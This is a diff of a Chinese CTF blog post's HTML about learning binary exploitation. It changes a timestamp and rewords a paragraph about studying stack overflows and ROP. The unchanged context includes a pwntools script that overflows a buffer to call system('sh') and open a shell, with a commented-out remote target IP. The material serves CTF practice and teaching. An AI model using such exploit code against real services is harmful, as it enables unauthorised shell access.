@@ -11,7 +11,7 @@
 <meta property="og:url" content="http://yoursite.com/2016/04/19/pwn-experience/index.html">
 <meta property="og:site_name" content="czl's blog">
 <meta property="og:description" content="2个月没更新了blog，在0CTF2016上被虐得一塌糊涂，闭关修炼pwn，终于在429ctf上有了零突破,这是第一次在比赛中做出pwn。这标志着一个新的开始，加油！！！">
-<meta property="og:updated_time" content="2016-04-19T17:20:26.000Z">
+<meta property="og:updated_time" content="2016-04-20T15:24:07.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwn学习经历">
 <meta name="twitter:description" content="2个月没更新了blog，在0CTF2016上被虐得一塌糊涂，闭关修炼pwn，终于在429ctf上有了零突破,这是第一次在比赛中做出pwn。这标志着一个新的开始，加油！！！">
@@ -98,7 +98,7 @@
 <p>而且可以指定特定平台，这样想要什么功能的 opcode 还不是信手拈来。而在构造exploit代码，pwntools提供的框架也十分的方便快捷。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'pwn1'</span>)</span><br><span class="line">pr = process(<span class="string">'./pwn1'</span>) </span><br><span class="line"><span class="comment"># pr = remote('120.27.144.177', 8000)</span></span><br><span class="line"></span><br><span class="line">addr_system = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">addr_sh = next(elf.search(<span class="string">'sh\0'</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">140</span>  + p32(addr_system) + p32(<span class="number">0xdeadbeaf</span>) + p32(addr_sh)</span><br><span class="line">pr.recvuntil(<span class="string">'input your name:'</span>)</span><br><span class="line">pr.sendline(payload)</span><br><span class="line">pr.recvuntil(<span class="string">':'</span>)</span><br><span class="line">pr.sendline(<span class="string">'1'</span>) </span><br><span class="line">pr.interactive()</span><br></pre></td></tr></table></figure>
 <p>远程和本地切换，只需要一个语句的改变;接收信息和发送信息十分方便;获得shell后可以进行手工交互（interactive）,这个设计太棒了。  </p>
-<p>开始学习原理和练习，栈溢出攻击很容易理解，但实践利用起来有些困难（ASLR，nx等），之后看了蒸米的《一步一步学ROP》系列，按照里面的讲解，自己做一边，对整个ROP有了一定理解。现在如果能发现程序的漏洞，也能写出exp来了。</p>
+<p>开始学习复习各种原理和练习，栈溢出攻击很容易理解，但实践操作起来有些困难（ASLR，nx等），之后看了蒸米的《一步一步学ROP》系列，按照里面的讲解，自己再做一遍，对ROP有了一定理解。现在如果能发现程序的漏洞，也能写出exp来了。</p>
 <h3 id="练习平台">练习平台</h3><ul>
 <li><a href="http://pwnable.kr/" target="_blank" rel="external">pwnable.kr</a></li>
 <li><a href="https://exploit-exercises.com/" target="_blank" rel="external">exploit-exercises</a></li>
@@ -120,7 +120,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/04/19/pwn-experience/" data-id="cin7hp1iq0005jsu9ajfb10uz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/04/19/pwn-experience/" data-id="ciqp5tjek0005jza2im36qtj2" class="article-share-link">Share</a>
       
       
     </footer>
